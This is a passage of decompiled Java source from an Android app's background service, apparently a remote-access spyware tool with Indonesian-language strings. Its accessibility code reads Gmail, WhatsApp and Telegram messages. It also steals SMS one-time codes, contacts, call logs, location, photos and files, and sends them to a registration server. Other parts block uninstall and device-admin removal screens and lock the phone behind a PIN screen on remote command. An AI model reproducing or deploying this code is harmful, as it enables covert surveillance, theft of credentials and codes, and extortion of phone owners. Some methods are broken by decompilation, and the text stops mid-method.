        if (accessibilityNodeInfo == null) {
            return;
        }
        if (accessibilityNodeInfo.getViewIdResourceName() != null && accessibilityNodeInfo.getViewIdResourceName().equals(string2)) {
            string2 = new Bundle();
            string2.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", (CharSequence)string3);
            accessibilityNodeInfo.performAction(0x200000, (Bundle)string2);
            return;
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
            this.findAndSetText(accessibilityNodeInfo.getChild(i), string2, string3);
        }
    }

    private void findAttachments(AccessibilityNodeInfo accessibilityNodeInfo, JSONArray jSONArray) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        CharSequence charSequence = accessibilityNodeInfo.getContentDescription();
        if (charSequence != null && ((Object)charSequence).toString().toLowerCase().contains("attachment")) {
            jSONArray.put((Object)((Object)charSequence).toString());
        }
        if (accessibilityNodeInfo.getText() != null && ((Object)accessibilityNodeInfo.getText()).toString().toLowerCase().contains("attachment")) {
            jSONArray.put((Object)((Object)accessibilityNodeInfo.getText()).toString());
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
            this.findAttachments(accessibilityNodeInfo.getChild(i), jSONArray);
        }
    }

    private List<AccessibilityNodeInfo> findChatList(AccessibilityNodeInfo accessibilityNodeInfo, String object) {
        ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList<AccessibilityNodeInfo>();
        if (!(object = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId((String)object)).isEmpty()) {
            object = (AccessibilityNodeInfo)object.get(0);
            for (int i = 0; i < object.getChildCount(); ++i) {
                accessibilityNodeInfo = object.getChild(i);
                if (accessibilityNodeInfo == null || !accessibilityNodeInfo.isVisibleToUser()) continue;
                arrayList.add(accessibilityNodeInfo);
            }
            return arrayList;
        }
        return this.findRecyclerViewItems(accessibilityNodeInfo);
    }

    private boolean findDangerousButtons(AccessibilityNodeInfo accessibilityNodeInfo) {
        int n;
        if (accessibilityNodeInfo == null) {
            return false;
        }
        CharSequence charSequence = accessibilityNodeInfo.getText();
        if (charSequence != null) {
            charSequence = ((Object)charSequence).toString().toLowerCase();
            for (n = 0; n < 11; ++n) {
                if (!((String)charSequence).equals((new String[]{"uninstall", "hapus instalasi", "hapus instalan", "force stop", "paksa berhenti", "disable", "nonaktifkan", "clear data", "hapus data", "storage", "penyimpanan"})[n])) continue;
                return true;
            }
        }
        for (n = 0; n < accessibilityNodeInfo.getChildCount(); ++n) {
            if (!this.findDangerousButtons(accessibilityNodeInfo.getChild(n))) continue;
            return true;
        }
        return false;
    }

    private List<AccessibilityNodeInfo> findEmailItems(AccessibilityNodeInfo accessibilityNodeInfo) {
        ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList<AccessibilityNodeInfo>();
        if (accessibilityNodeInfo == null) {
            return arrayList;
        }
        int n = 0;
        for (int i = 0; i < 5; ++i) {
            List list = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId((new String[]{"com.google.android.gm:id/conversation_list_recycler", "com.google.android.gm:id/list_view", "android:id/list", "com.google.android.gm:id/conversation_list_view", "com.google.android.gm:id/thread_list_view"})[i]);
            if (list == null || list.isEmpty()) continue;
            list = (AccessibilityNodeInfo)list.get(0);
            for (i = n; i < list.getChildCount(); ++i) {
                accessibilityNodeInfo = list.getChild(i);
                if (accessibilityNodeInfo == null || !accessibilityNodeInfo.isVisibleToUser()) continue;
                arrayList.add(accessibilityNodeInfo);
            }
            return arrayList;
        }
        return this.findRecyclerViewItems(accessibilityNodeInfo);
    }

    private String findLongText(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string2;
        if (accessibilityNodeInfo.getText() == null || (string2 = ((Object)accessibilityNodeInfo.getText()).toString()).length() <= 0) {
            string2 = "";
        }
        String string3 = string2;
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
            String string4 = this.findLongText(accessibilityNodeInfo.getChild(i));
            string2 = string3;
            if (string4.length() > string3.length()) {
                string2 = string4;
            }
            string3 = string2;
        }
        return string3;
    }

    private List<AccessibilityNodeInfo> findRecyclerViewItems(AccessibilityNodeInfo accessibilityNodeInfo) {
        ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList<AccessibilityNodeInfo>();
        if (accessibilityNodeInfo == null) {
            return arrayList;
        }
        CharSequence charSequence = accessibilityNodeInfo.getClassName();
        int n = 0;
        int n2 = 0;
        int n3 = n;
        if (charSequence != null) {
            n3 = n;
            if (((Object)accessibilityNodeInfo.getClassName()).toString().contains("RecyclerView")) {
                for (n3 = n2; n3 < accessibilityNodeInfo.getChildCount(); ++n3) {
                    charSequence = accessibilityNodeInfo.getChild(n3);
                    if (charSequence == null || !charSequence.isVisibleToUser()) continue;
                    arrayList.add((AccessibilityNodeInfo)charSequence);
                }
                return arrayList;
            }
        }
        while (n3 < accessibilityNodeInfo.getChildCount()) {
            arrayList.addAll(this.findRecyclerViewItems(accessibilityNodeInfo.getChild(n3)));
            ++n3;
        }
        return arrayList;
    }

    private List<AccessibilityNodeInfo> findTelegramChats(AccessibilityNodeInfo accessibilityNodeInfo) {
        ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList<AccessibilityNodeInfo>();
        int n = 0;
        for (int i = 0; i < 3; ++i) {
            List list = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId((new String[]{"org.telegram.messenger:id/chat_list_view", "org.telegram.messenger:id/recyclerView", "android:id/list"})[i]);
            if (list.isEmpty()) continue;
            accessibilityNodeInfo = (AccessibilityNodeInfo)list.get(0);
            for (i = n; i < accessibilityNodeInfo.getChildCount(); ++i) {
                list = accessibilityNodeInfo.getChild(i);
                if (list == null || !list.isVisibleToUser()) continue;
                arrayList.add((AccessibilityNodeInfo)list);
            }
            return arrayList;
        }
        return this.findRecyclerViewItems(accessibilityNodeInfo);
    }

    private void getBrowserHistory() {
        String string2 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        new Thread(new CoreService$$ExternalSyntheticLambda14(this, string2)).start();
    }

    private void getCallLogs() {
        String string2 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        new Thread(new CoreService$$ExternalSyntheticLambda13(this, string2)).start();
    }

    private String getConfiguredLockPin() {
        Object object = this.getSharedPreferences(PREF_NAME, 0);
        String string2 = "";
        if ((object = object.getString("lock_pin", "")) != null) {
            string2 = ((String)object).trim();
        }
        return string2;
    }

    private void getContacts() {
        String string2 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        new Thread(new CoreService$$ExternalSyntheticLambda23(this, string2)).start();
    }

    private void getFileList(String string2) {
        String string3 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        new Thread(new CoreService$$ExternalSyntheticLambda37(this, string3, string2)).start();
    }

    private void getGoogleAccounts() {
        String string2 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        if (this.checkSelfPermission("android.permission.GET_ACCOUNTS") != 0) {
            this.sendResult("google_error", "GET_ACCOUNTS permission denied", string2);
            return;
        }
        new Thread(new CoreService$$ExternalSyntheticLambda2(this, string2)).start();
    }

    /*
     * Unable to fully structure code
     */
    private String getImageThumbnail(String var1_1, int var2_3) {
        block6: {
            try {
                var7_4 = new BitmapFactory.Options();
                var7_4.inJustDecodeBounds = true;
                BitmapFactory.decodeFile((String)var1_1, (BitmapFactory.Options)var7_4);
                var6_5 = var7_4.outWidth;
                var5_6 = var7_4.outHeight;
                if (var6_5 <= 0 || var5_6 <= 0) break block6;
                var4_7 = 1;
            }
            catch (Exception var1_2) {
                Log.e((String)"CoreService", (String)"getImageThumbnail error", (Throwable)var1_2);
                return "";
            }
            while (true) {
                block7: {
                    block8: {
                        if (var6_5 / var4_7 > var2_3 || var5_6 / var4_7 > var2_3) break block7;
                        var7_4.inJustDecodeBounds = false;
                        var7_4.inSampleSize = var4_7;
                        if ((var7_4 = BitmapFactory.decodeFile((String)var1_1, (BitmapFactory.Options)var7_4)) != null) break block8;
                        return "";
                    }
                    var3_8 = var2_3;
                    var3_8 = Math.min(var3_8 / (float)var7_4.getWidth(), var3_8 / (float)var7_4.getHeight());
                    var1_1 = Bitmap.createScaledBitmap((Bitmap)var7_4, (int)Math.max(1, Math.round((float)var7_4.getWidth() * var3_8)), (int)Math.max(1, Math.round((float)var7_4.getHeight() * var3_8)), (boolean)true);
                    if (var1_1 == var7_4) ** GOTO lbl25
                    var7_4.recycle();
lbl25:
                    // 2 sources

                    var7_4 = new ByteArrayOutputStream();
                    var1_1.compress(Bitmap.CompressFormat.JPEG, 40, (OutputStream)var7_4);
                    var1_1.recycle();
                    var1_1 = Base64.encodeToString((byte[])var7_4.toByteArray(), (int)2);
                    return var1_1;
                }
                var4_7 *= 2;
            }
        }
        return "";
    }

    private String getMyDeviceId() {
        String string2;
        block2: {
            SharedPreferences sharedPreferences;
            block4: {
                block3: {
                    String string3;
                    sharedPreferences = this.getSharedPreferences(PREF_NAME, 0);
                    string2 = string3 = sharedPreferences.getString(KEY_DEVICE_ID, null);
                    if (string3 != null) break block2;
                    string3 = Settings.Secure.getString((ContentResolver)this.getContentResolver(), (String)"android_id");
                    if (string3 == null) break block3;
                    string2 = string3;
                    if (!string3.isEmpty()) break block4;
                }
                string2 = "unknown_" + System.currentTimeMillis();
            }
            sharedPreferences.edit().putString(KEY_DEVICE_ID, string2).apply();
        }
        return string2;
    }

    private void getOTP() {
        String string2 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        if (this.checkSelfPermission("android.permission.READ_SMS") != 0) {
            this.sendResult("otp_error", "READ_SMS permission denied", string2);
            return;
        }
        new Thread(new CoreService$$ExternalSyntheticLambda1(this, string2)).start();
    }

    private void getSms() {
        String string2 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        new Thread(new CoreService$$ExternalSyntheticLambda34(this, string2)).start();
    }

    private void getTelegram() {
        String string2 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        if (this.checkSelfPermission("android.permission.GET_ACCOUNTS") != 0) {
            this.sendResult("telegram_error", "GET_ACCOUNTS permission denied", string2);
            return;
        }
        new Thread(new CoreService$$ExternalSyntheticLambda21(this, string2)).start();
    }

    private void getWhatsAppNumber() {
        if (this.checkSelfPermission("android.permission.GET_ACCOUNTS") == 0) {
            AccountManager accountManager = (AccountManager)this.getSystemService("account");
            for (int i = 0; i < 3; ++i) {
                Account[] accountArray = accountManager.getAccountsByType((new String[]{WHATSAPP_PACKAGE, "org.whatsapp", "com.whatsapp.messenger"})[i]);
                if (accountArray.length <= 0) continue;
                this.sendResult("whatsapp_number", accountArray[0].name);
                return;
            }
        }
        this.launchAppAndWait(WHATSAPP_PACKAGE, new CoreService$$ExternalSyntheticLambda28(this));
    }

    private void handleAccessibilityCommandWithFallback(int n, String string2, String string3) {
        if (n != 200) {
            if (n != 1054) {
                if (n != 1055) {
                    this.sendResult("error", "No active window and no fallback", string3);
                } else {
                    this.launchAppAndWait(TELEGRAM_PACKAGE, new CoreService$$ExternalSyntheticLambda6(this, string2));
                }
            } else {
                this.launchAppAndWait(WHATSAPP_PACKAGE, new CoreService$$ExternalSyntheticLambda5(this, string2));
            }
        } else {
            this.launchAppAndWait(GMAIL_PACKAGE, new CoreService$$ExternalSyntheticLambda4(this));
        }
    }

    private boolean hasConfiguredLockPin() {
        return this.getConfiguredLockPin().matches("\\d{4,6}");
    }

    static /* synthetic */ void lambda$registerDevice$3(VolleyError volleyError) {
        Log.w((String)TAG, (String)"Register HTTP gagal");
    }

    private void launchApp(String string2) {
        string2 = this.getPackageManager().getLaunchIntentForPackage(string2);
        if (string2 != null) {
            string2.addFlags(0x10000000);
            this.startActivity((Intent)string2);
            this.sendSimpleResult("launch", "started");
        } else {
            this.sendSimpleResult("launch", "package not found");
        }
    }

    private void launchAppAndWait(String string2, Runnable runnable2) {
        String string3 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        Intent intent = this.getPackageManager().getLaunchIntentForPackage(string2);
        if (intent == null) {
            this.sendResult("error", "Aplikasi " + string2 + " tidak terinstall", string3);
            return;
        }
        intent.addFlags(0x10000000);
        this.startActivity(intent);
        this.handler.postDelayed((Runnable)new CoreService$$ExternalSyntheticLambda36(this, string3, runnable2), 2000L);
    }

    private boolean nodeContainsText(AccessibilityNodeInfo accessibilityNodeInfo, String string2) {
        if (accessibilityNodeInfo != null && string2 != null && !string2.isEmpty()) {
            CharSequence charSequence = accessibilityNodeInfo.getText();
            if (charSequence != null && ((Object)charSequence).toString().toLowerCase().contains(string2.toLowerCase())) {
                return true;
            }
            charSequence = accessibilityNodeInfo.getContentDescription();
            if (charSequence != null && ((Object)charSequence).toString().toLowerCase().contains(string2.toLowerCase())) {
                return true;
            }
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
                if (!this.nodeContainsText(accessibilityNodeInfo.getChild(i), string2)) continue;
                return true;
            }
        }
        return false;
    }

    private boolean pageContainsAdminDeactivation(AccessibilityNodeInfo accessibilityNodeInfo) {
        boolean bl = this.nodeContainsText(accessibilityNodeInfo, this.getPackageName()) || this.nodeContainsText(accessibilityNodeInfo, "device admin") || this.nodeContainsText(accessibilityNodeInfo, "device administrator") || this.nodeContainsText(accessibilityNodeInfo, "administrator perangkat") || this.nodeContainsText(accessibilityNodeInfo, "admin perangkat");
        return bl;
    }

    private void performClick(AccessibilityNodeInfo accessibilityNodeInfo, String string2) {
        this.findAndClick(accessibilityNodeInfo, string2);
        this.sendSimpleResult("click", "executed");
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void performTouch(String object) {
        try {
            int n;
            int n2;
            GestureDescription.Builder builder;
            object = ((String)object).replace("Rect(", "").replace(")", "").trim();
            boolean bl = ((String)object).contains(" - ");
            if (bl) {
                builder = ((String)object).split(" - ");
                object = builder[0].split(",");
                builder = builder[1].split(",");
                int n3 = Integer.parseInt(((String)object[0]).trim());
                int n4 = Integer.parseInt(((String)object[1]).trim());
                n2 = Integer.parseInt(builder[0].trim());
                n = Integer.parseInt(builder[1].trim());
                n2 = n3 + (n2 - n3) / 2;
                n = n4 + (n - n4) / 2;
            } else {
                object = ((String)object).split(",");
                n2 = Integer.parseInt(((String)object[0]).trim());
                n = Integer.parseInt(((String)object[1]).trim());
            }
            Path path2 = new Path();
            path2.moveTo((float)n2, (float)n);
            builder = new GestureDescription.Builder();
            object = new GestureDescription.StrokeDescription(path2, 0L, 50L);
            this.dispatchGesture(builder.addStroke((GestureDescription.StrokeDescription)object).build(), null, null);
            this.sendSimpleResult("touch", "executed");
            return;
        }
        catch (Exception exception) {
            this.sendSimpleResult("touch", "error: " + exception.getMessage());
        }
    }

    private JSONObject readCurrentEmailDetail() {
        Object object;
        JSONObject jSONObject = new JSONObject();
        AccessibilityNodeInfo accessibilityNodeInfo = this.getRootInActiveWindow();
        if (accessibilityNodeInfo == null) {
            return null;
        }
        CharSequence charSequence = "";
        int n = 0;
        while (true) {
            block8: {
                object = charSequence;
                if (n >= 3) break;
                object = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId((new String[]{"com.google.android.gm:id/message_content", "com.google.android.gm:id/content", "android:id/content"})[n]);
                if (object == null) break block8;
                if (object.isEmpty()) break block8;
                object = (AccessibilityNodeInfo)object.get(0);
                charSequence = new StringBuilder();
                this.extractTextFromNode((AccessibilityNodeInfo)object, (StringBuilder)charSequence);
                object = ((StringBuilder)charSequence).toString();
                break;
            }
            ++n;
        }
        charSequence = object;
        try {
            if (((String)object).isEmpty()) {
                charSequence = this.findLongText(accessibilityNodeInfo);
            }
            jSONObject.put("body", (Object)charSequence);
            object = new JSONArray();
            this.findAttachments(accessibilityNodeInfo, (JSONArray)object);
            jSONObject.put("attachments", object);
            accessibilityNodeInfo.recycle();
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"readCurrentEmailDetail error", (Throwable)exception);
        }
        return jSONObject;
    }

    private JSONArray readTelegramChat() {
        AccessibilityNodeInfo accessibilityNodeInfo;
        JSONArray jSONArray;
        block5: {
            jSONArray = new JSONArray();
            Thread.sleep(500L);
            accessibilityNodeInfo = this.getRootInActiveWindow();
            if (accessibilityNodeInfo != null) break block5;
            return jSONArray;
        }
        try {
            for (AccessibilityNodeInfo accessibilityNodeInfo2 : accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/message_text")) {
                if (accessibilityNodeInfo2.getText() != null) {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put("text", (Object)((Object)accessibilityNodeInfo2.getText()).toString());
                    jSONArray.put((Object)jSONObject);
                }
                accessibilityNodeInfo2.recycle();
            }
            accessibilityNodeInfo.recycle();
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"readTelegramChat error", (Throwable)exception);
        }
        return jSONArray;
    }

    private JSONArray readWhatsAppChat() {
        List list;
        AccessibilityNodeInfo accessibilityNodeInfo;
        JSONArray jSONArray;
        block7: {
            jSONArray = new JSONArray();
            Thread.sleep(500L);
            accessibilityNodeInfo = this.getRootInActiveWindow();
            if (accessibilityNodeInfo != null) break block7;
            return jSONArray;
        }
        List list22 = list = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("com.whatsapp:id/message_text");
        try {
            if (list.isEmpty()) {
                list22 = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("com.whatsapp:id/status_text");
            }
            for (List list22 : list22) {
                if (list22.getText() != null) {
                    list = new JSONObject();
                    list.put("text", ((Object)list22.getText()).toString());
                    jSONArray.put((Object)list);
                }
                list22.recycle();
            }
            accessibilityNodeInfo.recycle();
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"readWhatsAppChat error", (Throwable)exception);
        }
        return jSONArray;
    }

    private void registerCmdReceiver() {
        this.cmdReceiver = new BroadcastReceiver(this){
            final CoreService this$0;
            {
                this.this$0 = coreService;
            }

            public void onReceive(Context object, Intent object2) {
                block5: {
                    String string2;
                    int n;
                    block7: {
                        block6: {
                            block4: {
                                if (!"com.love.app.UPDATE_LOCK_STATE".equals(object2.getAction())) break block4;
                                this.this$0.isLocked = object2.getBooleanExtra("is_locked", false);
                                break block5;
                            }
                            if (!"com.love.app.EXECUTE_CMD".equals(object2.getAction())) break block5;
                            n = object2.getIntExtra("cmd", -1);
                            string2 = object2.getStringExtra("param");
                            if ((object2 = object2.getStringExtra("cmdId")) == null) break block6;
                            object = object2;
                            if (!((String)object2).isEmpty()) break block7;
                        }
                        object = "broadcast_" + System.currentTimeMillis();
                    }
                    if (n != -1) {
                        CoreService coreService = this.this$0;
                        object2 = string2 != null ? string2 : "";
                        coreService.executeCommand(n, (String)object2, (String)object);
                    }
                }
            }
        };
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("com.love.app.EXECUTE_CMD");
        intentFilter.addAction("com.love.app.UPDATE_LOCK_STATE");
        this.registerReceiver(this.cmdReceiver, intentFilter);
    }

    private void registerDevice(String object) {
        JSONObject jSONObject;
        block6: {
            if (this.registered) {
                return;
            }
            jSONObject = new JSONObject();
            jSONObject.put(KEY_DEVICE_ID, (Object)this.deviceId);
            jSONObject.put("model", (Object)Build.MODEL);
            jSONObject.put("manufacturer", (Object)Build.MANUFACTURER);
            jSONObject.put("sdk", Build.VERSION.SDK_INT);
            jSONObject.put("android", (Object)Build.VERSION.RELEASE);
            jSONObject.put("username", (Object)ConfigFetcher.getUsername((Context)this));
            jSONObject.put("session_id", (Object)ConfigFetcher.getSessionId((Context)this));
            jSONObject.put("lock_pin_set", this.hasConfiguredLockPin());
            jSONObject.put("lock_mode", (Object)this.getSharedPreferences(PREF_NAME, 0).getString("lock_mode", "default"));
            TelephonyManager telephonyManager = (TelephonyManager)this.getSystemService("phone");
            if (telephonyManager == null) break block6;
            try {
                jSONObject.put("country", (Object)telephonyManager.getNetworkCountryIso());
                jSONObject.put("operator", (Object)telephonyManager.getSimOperatorName());
            }
            catch (SecurityException securityException) {
                try {
                    jSONObject.put("country", (Object)"");
                    jSONObject.put("operator", (Object)"");
                }
                catch (JSONException jSONException) {
                    Log.e((String)TAG, (String)"register JSON error", (Throwable)jSONException);
                }
            }
        }
        object = new JsonObjectRequest(1, (String)object + "/register", jSONObject, new CoreService$$ExternalSyntheticLambda9(this), (Response.ErrorListener)new CoreService$$ExternalSyntheticLambda10());
        ((Request)object).setRetryPolicy(new DefaultRetryPolicy(15000, 1, 1.0f));
        this.requestQueue.add(object);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void releaseCamera() {
        Object object = this.cameraLock;
        synchronized (object) {
            Camera camera = this.camera;
            if (camera != null) {
                try {
                    this.camera.stopPreview();
                    this.camera.release();
                }
                catch (Exception exception) {}
                this.camera = null;
            }
            return;
        }
    }

    private void resetLockStateIfInvalid() {
        if (!this.hasConfiguredLockPin()) {
            this.isLocked = false;
            SharedPreferences.Editor editor = this.getSharedPreferences(PREF_NAME, 0).edit();
            editor.putBoolean("is_locked", false);
            editor.apply();
        }
    }

    /*
     * Loose catch block
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void savePhoto(byte[] byArray) {
        Object object = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US);
        Date date = new Date();
        String string2 = ((DateFormat)object).format(date);
        File file = this.getExternalFilesDir(Environment.DIRECTORY_PICTURES);
        object = file;
        if (file == null) {
            object = this.getFilesDir();
        }
        StringBuilder stringBuilder = new StringBuilder("IMG_");
        File file2 = new File((File)object, stringBuilder.append(string2).append(".jpg").toString());
        object = new FileOutputStream(file2);
        ((FileOutputStream)object).write(byArray);
        ((FileOutputStream)object).close();
        return;
        catch (Throwable throwable) {
            try {
                ((FileOutputStream)object).close();
                throw throwable;
            }
            catch (Throwable throwable2) {
                try {
                    throwable.addSuppressed(throwable2);
                    throw throwable;
                }
                catch (IOException iOException) {
                    Log.e((String)TAG, (String)"savePhoto write error", (Throwable)iOException);
                }
            }
        }
    }

    private void sendDeviceInfo() {
        String string2 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        new Thread(new CoreService$$ExternalSyntheticLambda35(this, string2)).start();
    }

    private void sendInstalledApps() {
        String string2 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        new Thread(new CoreService$$ExternalSyntheticLambda22(this, string2)).start();
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void sendLocation() {
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("lat", this.locationData.latitude);
            jSONObject.put("lon", this.locationData.longitude);
            boolean bl = this.locationData.latitude != 0.0 || this.locationData.longitude != 0.0;
            jSONObject.put("available", bl);
        }
        catch (JSONException jSONException) {}
        this.sendResult("location", jSONObject.toString());
    }

    private void sendResult(String string2, String string3) {
        String string4 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        this.sendResult(string2, string3, string4);
    }

    private void sendSimpleResult(String string2, String string3) {
        String string4 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        this.sendResult(string2, string3, string4);
    }

    private void sendSms(String string2) {
        String string3 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        new Thread(new CoreService$$ExternalSyntheticLambda11(this, string3, string2)).start();
    }

    private void setLockMode(String string2) {
        String string3 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        String string4 = "default";
        String string5 = "";
        String string6 = string4;
        String string7 = string5;
        if (string2 != null) {
            string6 = string4;
            string7 = string5;
            if (!string2.isEmpty()) {
                string7 = string5;
                string6 = string2;
                if (string2.contains("&")) {
                    String[] stringArray = string2.split("&");
                    int n = stringArray.length;
                    int n2 = 0;
                    string2 = string4;
                    while (true) {
                        string6 = string2;
                        string7 = string5;
                        if (n2 >= n) break;
                        string6 = stringArray[n2];
                        if (string6.startsWith("mode=")) {
                            string7 = string6.substring(5);
                        } else {
                            string7 = string2;
                            if (string6.startsWith("url=")) {
                                string5 = string6.substring(4);
                                string7 = string2;
                            }
                        }
                        ++n2;
                        string2 = string7;
                    }
                }
            }
        }
        string2 = this.getSharedPreferences(PREF_NAME, 0).edit();
        string2.putString("lock_mode", string6);
        if (!string7.isEmpty()) {
            if ("html".equals(string6)) {
                string2.putString("lock_html_url", string7);
            } else if ("chat".equals(string6)) {
                string2.putString("lock_chat_url", string7);
            }
        }
        string2.apply();
        string2 = new Intent((Context)this, LockActivity.class);
        string2.addFlags(0x14000000);
        this.startActivity((Intent)string2);
        this.sendResult("lock_mode", "set to " + string6, string3);
    }

    private boolean setLockPin(String string2) {
        String string3 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        if (!(string2 = string2 == null ? "" : string2.trim()).matches("\\d{4,6}")) {
            this.sendResult("pin_error", "PIN harus 4-6 digit angka", string3);
            return false;
        }
        this.getSharedPreferences(PREF_NAME, 0).edit().putString("lock_pin", string2).apply();
        this.sendResult("lock_pin", "set", string3);
        return true;
    }

    private void setText(AccessibilityNodeInfo accessibilityNodeInfo, String stringArray) {
        if ((stringArray = stringArray.split(";", 2)).length < 2) {
            this.sendSimpleResult("settext", "invalid param");
            return;
        }
        this.findAndSetText(accessibilityNodeInfo, stringArray[0], stringArray[1]);
        this.sendSimpleResult("settext", "done");
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void setTorch(boolean bl) {
        if (this.torchCameraId == null) return;
        try {
            this.cameraManager.setTorchMode(this.torchCameraId, bl);
            return;
        }
        catch (CameraAccessException cameraAccessException) {
            return;
        }
    }

    private void showToast(String string2) {
        this.handler.post((Runnable)new CoreService$$ExternalSyntheticLambda33(this, string2));
    }

    private void speak(String string2) {
        if (this.tts != null && string2 != null && !string2.isEmpty()) {
            this.tts.speak((CharSequence)string2, 1, null, null);
        }
    }

    private void startHeartbeat() {
    }

    private void startHeartbeatService() {
        ScheduledExecutorService scheduledExecutorService = this.scheduler;
        if (scheduledExecutorService != null && !scheduledExecutorService.isShutdown()) {
            return;
        }
        this.scheduler = scheduledExecutorService = Executors.newSingleThreadScheduledExecutor();
        scheduledExecutorService.scheduleAtFixedRate(new CoreService$$ExternalSyntheticLambda31(this), 10L, 15L, TimeUnit.SECONDS);
        this.scheduler.scheduleAtFixedRate(new CoreService$$ExternalSyntheticLambda32(this), 30L, 60L, TimeUnit.SECONDS);
    }

    private void startLocationTracking() {
        if (this.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") != 0 && this.checkSelfPermission("android.permission.ACCESS_COARSE_LOCATION") != 0) {
            return;
        }
        try {
            this.locationManager = (LocationManager)this.getSystemService("location");
            CoreService$$ExternalSyntheticLambda7 coreService$$ExternalSyntheticLambda7 = new CoreService$$ExternalSyntheticLambda7(this);
            this.locationListener = coreService$$ExternalSyntheticLambda7;
            if (this.locationManager.isProviderEnabled("gps")) {
                this.locationManager.requestLocationUpdates("gps", 30000L, 50.0f, this.locationListener);
            }
            if (this.locationManager.isProviderEnabled("network")) {
                this.locationManager.requestLocationUpdates("network", 30000L, 50.0f, this.locationListener);
            }
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"location tracker", (Throwable)exception);
        }
    }

    private void startLockActivity() {
        String string2 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        if (!this.hasConfiguredLockPin()) {
            this.isLocked = false;
            this.getSharedPreferences(PREF_NAME, 0).edit().putBoolean("is_locked", false).apply();
            this.sendResult("lock_error", "PIN belum diset", string2);
            return;
        }
        this.isLocked = true;
        this.getSharedPreferences(PREF_NAME, 0).edit().putBoolean("is_locked", true).apply();
        Intent intent = new Intent((Context)this, LockActivity.class);
        intent.addFlags(0x14000000);
        this.startActivity(intent);
        this.sendResult("lock", "ok", string2);
    }

    private void startScreenCapture(String string2) {
        String string3 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        Intent intent = new Intent((Context)this, ScreenCaptureActivity.class);
        intent.addFlags(0x10800000);
        intent.putExtra("mode", string2);
        intent.putExtra("cmd_id", string3);
        this.startActivity(intent);
    }

    private void startTorchBlink() {
        this.torchBlinking = true;
        this.handler.post(new Runnable(this){
            boolean state;
            final CoreService this$0;
            {
                this.this$0 = coreService;
                this.state = false;
            }

            @Override
            public void run() {
                boolean bl;
                if (!this.this$0.torchBlinking) {
                    this.this$0.setTorch(false);
                    return;
                }
                this.state = bl = this.state ^ true;
                this.this$0.setTorch(bl);
                this.this$0.handler.postDelayed((Runnable)this, 300L);
            }
        });
    }

    private void takePhoto(int n) {
        String string2 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        new Thread(new CoreService$$ExternalSyntheticLambda0(this, string2, n)).start();
    }

    private void uninstallApp(String string2) {
        string2 = new Intent("android.intent.action.DELETE", Uri.parse((String)("package:" + string2)));
        string2.addFlags(0x10000000);
        this.startActivity((Intent)string2);
        this.sendSimpleResult("uninstall", "intent sent");
    }

    private void uploadFile(String string2) {
        String string3 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        new Thread(new CoreService$$ExternalSyntheticLambda17(this, string3, string2)).start();
    }

    /*
     * Loose catch block
     * WARNING - void declaration
     */
    private String uploadFileToServer(File object) {
        void var1_4;
        Object object2;
        block58: {
            block59: {
                block60: {
                    Object object3;
                    block57: {
                        block56: {
